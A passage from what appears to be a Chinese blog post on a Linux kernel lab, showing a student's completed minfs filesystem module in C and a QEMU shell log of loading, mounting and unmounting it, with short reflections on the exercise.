class="title">bh</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">dir</span> =</span> dentry-&gt;d_parent-&gt;d_inode;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">minfs_inode_info</span> *<span class="title">mii</span> =</span> container_of(dir,</span><br><span class="line">			struct minfs_inode_info, vfs_inode);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">sb</span> =</span> dir-&gt;i_sb;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *name = dentry-&gt;d_name.name;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">minfs_dir_entry</span> *<span class="title">final_de</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">minfs_dir_entry</span> *<span class="title">de</span>;</span></span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 6: Read parent folder data block (contains dentries).</span></span><br><span class="line"><span class="comment">	 * Fill bhp with return value.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	bh = sb_bread(sb,mii-&gt;data_block);</span><br><span class="line">	<span class="keyword">if</span> (bh == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	*bhp = bh;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MINFS_NUM_ENTRIES; i++) &#123;</span><br><span class="line">		<span class="comment">/* TODO 6: Traverse all entries, find entry by name</span></span><br><span class="line"><span class="comment">		 * Use `de&#x27; to traverse. Use `final_de&#x27; to store dentry</span></span><br><span class="line"><span class="comment">		 * found, if existing.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		de = ((struct minfs_dir_entry *) bh-&gt;b_data) + i;</span><br><span class="line">		<span class="keyword">if</span> (de-&gt;ino != <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="comment">/* found it */</span></span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">strcmp</span>(name, de-&gt;name) == <span class="number">0</span>) &#123;</span><br><span class="line">				printk(KERN_DEBUG <span class="string">&quot;Found entry %s on position: %zd\n&quot;</span>,</span><br><span class="line">					name, i);</span><br><span class="line">				final_de = de;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* bh needs to be released by caller. */</span></span><br><span class="line">	<span class="keyword">return</span> final_de;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct dentry *<span class="title">minfs_lookup</span><span class="params">(struct inode *dir,</span></span></span><br><span class="line"><span class="params"><span class="function">		struct dentry *dentry, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* TODO 6: Comment line. */</span></span><br><span class="line">	<span class="keyword">return</span> simple_lookup(dir, dentry, flags);</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">sb</span> =</span> dir-&gt;i_sb;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">minfs_dir_entry</span> *<span class="title">de</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> *<span class="title">bh</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	dentry-&gt;d_op = sb-&gt;s_root-&gt;d_op;</span><br><span class="line"></span><br><span class="line">	de = minfs_find_entry(dentry, &amp;bh);</span><br><span class="line">	<span class="keyword">if</span> (de != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		printk(KERN_DEBUG <span class="string">&quot;getting entry: name: %s, ino: %d\n&quot;</span>,</span><br><span class="line">			de-&gt;name, de-&gt;ino);</span><br><span class="line">		inode = minfs_iget(sb, de-&gt;ino);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(inode))</span><br><span class="line">			<span class="keyword">return</span> ERR_CAST(inode);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	d_add(dentry, inode);</span><br><span class="line">	brelse(bh);</span><br><span class="line"></span><br><span class="line">	printk(KERN_DEBUG <span class="string">&quot;looked up dentry %s\n&quot;</span>, dentry-&gt;d_name.name);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct inode *<span class="title">minfs_alloc_inode</span><span class="params">(struct super_block *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">minfs_inode_info</span> *<span class="title">mii</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 3: Allocate minfs_inode_info. */</span></span><br><span class="line">	mii = (struct minfs_inode_info *)kmalloc(<span class="keyword">sizeof</span>(struct minfs_inode_info),<span class="number">0</span>);</span><br><span class="line">	<span class="comment">/* TODO 3: init VFS inode in minfs_inode_info */</span></span><br><span class="line">	inode_init_once(&amp;mii-&gt;vfs_inode);</span><br><span class="line">	<span class="keyword">return</span> &amp;mii-&gt;vfs_inode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">minfs_destroy_inode</span><span class="params">(struct inode *inode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* TODO 3: free minfs_inode_info */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">minfs_inode_info</span> *<span class="title">mii</span> =</span> container_of(inode, struct minfs_inode_info, vfs_inode);</span><br><span class="line">	kfree(mii);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Create a new VFS inode. Do basic initialization and fill imap.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct inode *<span class="title">minfs_new_inode</span><span class="params">(struct inode *dir)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">sb</span> =</span> dir-&gt;i_sb;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">minfs_sb_info</span> *<span class="title">sbi</span> =</span> sb-&gt;s_fs_info;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>;</span></span><br><span class="line">	<span class="keyword">int</span> idx;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 7: Find first available inode. */</span></span><br><span class="line">	idx = find_first_zero_bit(&amp;sbi-&gt;imap, MINFS_NUM_INODES);</span><br><span class="line">	<span class="keyword">if</span> (idx == MINFS_NUM_INODES) &#123;</span><br><span class="line">		printk(LOG_LEVEL <span class="string">&quot;no space left in imap\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* TODO 7: Mark the inode as used in the bitmap and mark</span></span><br><span class="line"><span class="comment">	 * the superblock buffer head as dirty.</span></span><br><span class="line"><span class="comment">	 */</span>	</span><br><span class="line">	__test_and_set_bit(idx, &amp;sbi-&gt;imap);</span><br><span class="line">	mark_buffer_dirty(sbi-&gt;sbh);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 7: Call new_inode(), fill inode fields</span></span><br><span class="line"><span class="comment">	 * and insert inode into inode hash table.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	inode = new_inode(sb);</span><br><span class="line">	inode-&gt;i_uid = current_fsuid();</span><br><span class="line">	inode-&gt;i_gid = current_fsgid();</span><br><span class="line">	inode-&gt;i_ino = idx;</span><br><span class="line">	inode-&gt;i_mtime = inode-&gt;i_atime = inode-&gt;i_ctime = current_time(inode);</span><br><span class="line">	inode-&gt;i_blocks = <span class="number">0</span>;</span><br><span class="line">	insert_inode_hash(inode);</span><br><span class="line">	<span class="comment">/* Actual writing to the disk will be done in minfs_write_inode,</span></span><br><span class="line"><span class="comment">	 * which will be called at a later time.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> inode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Add dentry link on parent inode disk structure.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">minfs_add_link</span><span class="params">(struct dentry *dentry, struct inode *inode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> *<span class="title">bh</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">dir</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">sb</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">minfs_inode_info</span> *<span class="title">mii</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">minfs_dir_entry</span> *<span class="title">de</span>;</span></span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 7: Get: directory inode (in inode); containing inode (in mii); superblock (in sb). */</span></span><br><span class="line">	dir = dentry-&gt;d_parent-&gt;d_inode;</span><br><span class="line">	mii = container_of(dir, struct minfs_inode_info, vfs_inode);</span><br><span class="line">	sb = dir-&gt;i_sb;</span><br><span class="line">	<span class="comment">/* TODO 7: Read dir data block (use sb_bread). */</span></span><br><span class="line">	bh = sb_bread(sb, mii-&gt;data_block);</span><br><span class="line">	<span class="comment">/* TODO 7: Find first free dentry (de-&gt;ino == 0). */</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MINFS_NUM_ENTRIES; i++) &#123;</span><br><span class="line">		de = (struct minfs_dir_entry *) bh-&gt;b_data + i;</span><br><span class="line">		<span class="keyword">if</span> (de-&gt;ino == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (i == MINFS_NUM_ENTRIES) &#123;</span><br><span class="line">		err = -ENOSPC;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* TODO 7: Place new entry in the available slot. Mark buffer_head</span></span><br><span class="line"><span class="comment">	 * as dirty. */</span></span><br><span class="line">	de-&gt;ino = inode-&gt;i_ino;</span><br><span class="line">	<span class="built_in">memcpy</span>(de-&gt;name, dentry-&gt;d_name.name, MINFS_NAME_LEN);</span><br><span class="line">	dir-&gt;i_mtime = dir-&gt;i_ctime = current_time(inode);</span><br><span class="line">	mark_buffer_dirty(bh);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	brelse(bh);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Create a VFS file inode. Use minfs_file_... operations.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">minfs_create</span><span class="params">(struct inode *dir, struct dentry *dentry, <span class="keyword">umode_t</span> mode,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">bool</span> excl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">minfs_inode_info</span> *<span class="title">mii</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	inode = minfs_new_inode(dir);</span><br><span class="line">	<span class="keyword">if</span> (inode == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		printk(LOG_LEVEL <span class="string">&quot;error allocating new inode\n&quot;</span>);</span><br><span class="line">		err = -ENOMEM;</span><br><span class="line">		<span class="keyword">goto</span> err_new_inode;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	inode-&gt;i_mode = mode;</span><br><span class="line">	inode-&gt;i_op = &amp;minfs_file_inode_operations;</span><br><span class="line">	inode-&gt;i_fop = &amp;minfs_file_operations;</span><br><span class="line">	mii = container_of(inode, struct minfs_inode_info, vfs_inode);</span><br><span class="line">	mii-&gt;data_block = MINFS_FIRST_DATA_BLOCK + inode-&gt;i_ino;</span><br><span class="line"></span><br><span class="line">	err = minfs_add_link(dentry, inode);</span><br><span class="line">	<span class="keyword">if</span> (err != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> err_add_link;</span><br><span class="line"></span><br><span class="line">	d_instantiate(dentry, inode);</span><br><span class="line">	mark_inode_dirty(inode);</span><br><span class="line"></span><br><span class="line">	printk(KERN_DEBUG <span class="string">&quot;new file inode created (ino = %lu)\n&quot;</span>,</span><br><span class="line">		inode-&gt;i_ino);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err_add_link:</span><br><span class="line">	inode_dec_link_count(inode);</span><br><span class="line">	iput(inode);</span><br><span class="line">err_new_inode:</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Write VFS inode contents to disk inode.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">minfs_write_inode</span><span class="params">(struct inode *inode,</span></span></span><br><span class="line"><span class="params"><span class="function">		struct writeback_control *wbc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">sb</span> =</span> inode-&gt;i_sb;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">minfs_inode</span> *<span class="title">mi</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">minfs_inode_info</span> *<span class="title">mii</span> =</span> container_of(inode,</span><br><span class="line">			struct minfs_inode_info, vfs_inode);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> *<span class="title">bh</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	bh = sb_bread(sb, MINFS_INODE_BLOCK);</span><br><span class="line">	<span class="keyword">if</span> (bh == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		printk(LOG_LEVEL <span class="string">&quot;could not read block\n&quot;</span>);</span><br><span class="line">		err = -ENOMEM;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	mi = (struct minfs_inode *) bh-&gt;b_data + inode-&gt;i_ino;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* fill disk inode */</span></span><br><span class="line">	mi-&gt;mode = inode-&gt;i_mode;</span><br><span class="line">	mi-&gt;uid = i_uid_read(inode);</span><br><span class="line">	mi-&gt;gid = i_gid_read(inode);</span><br><span class="line">	mi-&gt;size = inode-&gt;i_size;</span><br><span class="line">	mi-&gt;data_block = mii-&gt;data_block;</span><br><span class="line"></span><br><span class="line">	printk(KERN_DEBUG <span class="string">&quot;mode is %05o; data_block is %d\n&quot;</span>, mi-&gt;mode,</span><br><span class="line">		mii-&gt;data_block);</span><br><span class="line"></span><br><span class="line">	mark_buffer_dirty(bh);</span><br><span class="line">	brelse(bh);</span><br><span class="line"></span><br><span class="line">	printk(KERN_DEBUG <span class="string">&quot;wrote inode %lu\n&quot;</span>, inode-&gt;i_ino);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">minfs_put_super</span><span class="params">(struct super_block *sb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">minfs_sb_info</span> *<span class="title">sbi</span> =</span> sb-&gt;s_fs_info;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Free superblock buffer head. */</span></span><br><span class="line">	mark_buffer_dirty(sbi-&gt;sbh);</span><br><span class="line">	brelse(sbi-&gt;sbh);</span><br><span class="line"></span><br><span class="line">	printk(KERN_DEBUG <span class="string">&quot;released superblock resources\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">super_operations</span> <span class="title">minfs_ops</span> =</span> &#123;</span><br><span class="line">	.statfs		= simple_statfs,</span><br><span class="line">	.put_super	= minfs_put_super,</span><br><span class="line">	<span class="comment">/* TODO 4: add alloc and destroy inode functions */</span></span><br><span class="line">	.alloc_inode = minfs_alloc_inode,</span><br><span class="line">	.destroy_inode = minfs_destroy_inode,</span><br><span class="line">	<span class="comment">/* TODO 7:	= set write_inode function. */</span></span><br><span class="line">	.write_inode = minfs_write_inode,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">minfs_fill_super</span><span class="params">(struct super_block *s, <span class="keyword">void</span> *data, <span class="keyword">int</span> silent)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">minfs_sb_info</span> *<span class="title">sbi</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">minfs_super_block</span> *<span class="title">ms</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">root_inode</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">root_dentry</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> *<span class="title">bh</span>;</span></span><br><span class="line">	<span class="keyword">int</span> ret = -EINVAL;</span><br><span class="line"></span><br><span class="line">	sbi = kzalloc(<span class="keyword">sizeof</span>(struct minfs_sb_info), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!sbi)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	s-&gt;s_fs_info = sbi;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Set block size for superblock. */</span></span><br><span class="line">	<span class="keyword">if</span> (!sb_set_blocksize(s, MINFS_BLOCK_SIZE))</span><br><span class="line">		<span class="keyword">goto</span> out_bad_blocksize;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 2: Read block with superblock. It&#x27;s the first block on</span></span><br><span class="line"><span class="comment">	 * the device, i.e. the block with the index 0. This is the index</span></span><br><span class="line"><span class="comment">	 * to be passed to sb_bread().</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	bh = sb_bread(s,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(bh == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="keyword">goto</span> out_bad_sb;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* TODO 2: interpret read data as minfs_super_block */</span></span><br><span class="line">	ms = (struct minfs_super_block*)bh-&gt;b_data;</span><br><span class="line">	<span class="comment">/* TODO 2: check magic number with value defined in minfs.h. jump to out_bad_magic if not suitable */</span></span><br><span class="line">	<span class="keyword">if</span>(ms-&gt;magic != MINFS_MAGIC)&#123;</span><br><span class="line">		<span class="keyword">goto</span> out_bad_magic;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* TODO 2: fill super_block with magic_number, super_operations */</span></span><br><span class="line">	s-&gt;s_magic = MINFS_MAGIC;</span><br><span class="line">	s-&gt;s_op = &amp;minfs_ops;</span><br><span class="line">	<span class="comment">/* TODO 2: Fill sbi with rest of information from disk superblock</span></span><br><span class="line"><span class="comment">	 * (i.e. version).</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	sbi-&gt;version = ms-&gt;version;</span><br><span class="line">	sbi-&gt;imap = ms-&gt;imap;</span><br><span class="line">	<span class="comment">/* allocate root inode and root dentry */</span></span><br><span class="line">	<span class="comment">/* TODO 2: use myfs_get_inode instead of minfs_iget */</span></span><br><span class="line">	root_inode = minfs_iget(s, MINFS_ROOT_INODE);</span><br><span class="line">	<span class="keyword">if</span> (!root_inode)</span><br><span class="line">		<span class="keyword">goto</span> out_bad_inode;</span><br><span class="line"></span><br><span class="line">	root_dentry = d_make_root(root_inode);</span><br><span class="line">	<span class="keyword">if</span> (!root_dentry)</span><br><span class="line">		<span class="keyword">goto</span> out_iput;</span><br><span class="line">	s-&gt;s_root = root_dentry;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Store superblock buffer_head for further use. */</span></span><br><span class="line">	sbi-&gt;sbh = bh;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out_iput:</span><br><span class="line">	iput(root_inode);</span><br><span class="line">out_bad_inode:</span><br><span class="line">	printk(LOG_LEVEL <span class="string">&quot;bad inode\n&quot;</span>);</span><br><span class="line">out_bad_magic:</span><br><span class="line">	printk(LOG_LEVEL <span class="string">&quot;bad magic number\n&quot;</span>);</span><br><span class="line">	brelse(bh);</span><br><span class="line">out_bad_sb:</span><br><span class="line">	printk(LOG_LEVEL <span class="string">&quot;error reading buffer_head\n&quot;</span>);</span><br><span class="line">out_bad_blocksize:</span><br><span class="line">	printk(LOG_LEVEL <span class="string">&quot;bad block size\n&quot;</span>);</span><br><span class="line">	s-&gt;s_fs_info = <span class="literal">NULL</span>;</span><br><span class="line">	kfree(sbi);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct dentry *<span class="title">minfs_mount</span><span class="params">(struct file_system_type *fs_type,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">int</span> flags, <span class="keyword">const</span> <span class="keyword">char</span> *dev_name, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* TODO 1: call superblock mount function */</span></span><br><span class="line">	<span class="keyword">return</span> mount_bdev(fs_type, flags, dev_name, data, minfs_fill_super);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span> <span class="title">minfs_fs_type</span> =</span> &#123;</span><br><span class="line">	.owner		= THIS_MODULE,</span><br><span class="line">	.name		= <span class="string">&quot;minfs&quot;</span>,</span><br><span class="line">	<span class="comment">/* TODO 1: add mount, kill_sb and fs_flags */</span></span><br><span class="line">	.mount		= minfs_mount,</span><br><span class="line">	.kill_sb	= kill_litter_super,</span><br><span class="line">	.fs_flags	= FS_USERNS_MOUNT,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">minfs_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	err = register_filesystem(&amp;minfs_fs_type);</span><br><span class="line">	<span class="keyword">if</span> (err) &#123;</span><br><span class="line">		printk(LOG_LEVEL <span class="string">&quot;register_filesystem failed\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">minfs_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	unregister_filesystem(&amp;minfs_fs_type);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(minfs_init);</span><br><span class="line">module_exit(minfs_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/filesystems/minfs/user<span class="meta"># set -ex</span></span><br><span class="line">root@qemux86:~/skels/filesystems/minfs/user<span class="meta"># insmod ../kernel/minfs.ko</span></span><br><span class="line">+ insmod ../kernel/minfs.ko</span><br><span class="line">minfs: loading out-of-tree <span class="keyword">module</span> taints kernel.</span><br><span class="line">root@qemux86:~/skels/filesystems/minfs/user<span class="meta"># mkdir -p /mnt/minfs</span></span><br><span class="line">+ mkdir -p /mnt/minfs</span><br><span class="line">root@qemux86:~/skels/filesystems/minfs/user# ./mkfs.minfs /dev/vdb</span><br><span class="line">+ ./mkfs.minfs /dev/vdb</span><br><span class="line">root@qemux86:~/skels/filesystems/minfs/user<span class="meta"># mount -t minfs /dev/vdb /mnt/minfs</span></span><br><span class="line">+ mount -t minfs /dev/vdb /mnt/minfs</span><br><span class="line">root@qemux86:~/skels/filesystems/minfs/user<span class="meta"># cat /proc/filesystems | grep minfs</span></span><br><span class="line">+ cat /proc/filesystems</span><br><span class="line">+ grep minfs</span><br><span class="line">nodev   minfs</span><br><span class="line">root@qemux86:~/skels/filesystems/minfs/user<span class="meta"># cat /proc/mounts | grep minfs</span></span><br><span class="line">+ + grep minfs</span><br><span class="line">cat /proc/mounts</span><br><span class="line">/dev/vdb /mnt/minfs minfs rw,relatime <span class="number">0</span> <span class="number">0</span></span><br><span class="line">root@qemux86:~/skels/filesystems/minfs/user<span class="meta"># stat -f /mnt/minfs</span></span><br><span class="line">+ stat -f /mnt/minfs</span><br><span class="line">  File: <span class="string">&quot;/mnt/minfs&quot;</span></span><br><span class="line">    ID: <span class="number">0</span>        Namelen: <span class="number">255</span>     Type: UNKNOWN</span><br><span class="line">Block size: <span class="number">4096</span>      </span><br><span class="line">Blocks: Total: <span class="number">0</span>          Free: <span class="number">0</span>          Available: <span class="number">0</span></span><br><span class="line">Inodes: Total: <span class="number">0</span>          Free: <span class="number">0</span></span><br><span class="line">root@qemux86:~/skels/filesystems/minfs/user<span class="meta"># cd /mnt/minfs</span></span><br><span class="line">+ cd /mnt/minfs</span><br><span class="line">root@qemux86:/mnt/minfs<span class="meta"># ls -la</span></span><br><span class="line">Read a.txt from folder /, ctx-&gt;pos: <span class="number">0</span></span><br><span class="line">ls: ./a.txt: No such file <span class="keyword">or</span> directory</span><br><span class="line">root@qemux86:/mnt/minfs<span class="meta"># mode is 40755; data_block is 2</span></span><br><span class="line">wrote inode <span class="number">0</span></span><br><span class="line"></span><br><span class="line">root@qemux86:/mnt/minfs<span class="meta"># cd ..</span></span><br><span class="line">root@qemux86:/mnt<span class="meta"># umount /mnt/minfs</span></span><br><span class="line">released superblock resources</span><br><span class="line">root@qemux86:/mnt<span class="meta"># rmmod minfs</span></span><br></pre></td></tr></table></figure>
<ul>
<li>感觉本实验其实就主要完成了两个工作：<ul>
<li><code>register_filesystem(&amp;minfs_fs_type)</code> 和 <code>unregister_filesystem(&amp;minfs_fs_type)</code></li>
<li>其他的操作都是对上面这两个操作的完善</li>
</ul>
</li>
<li>新注册文件系统只有一个操作是需要由我们完成的：<code>minfs_mount</code></li>
</ul>
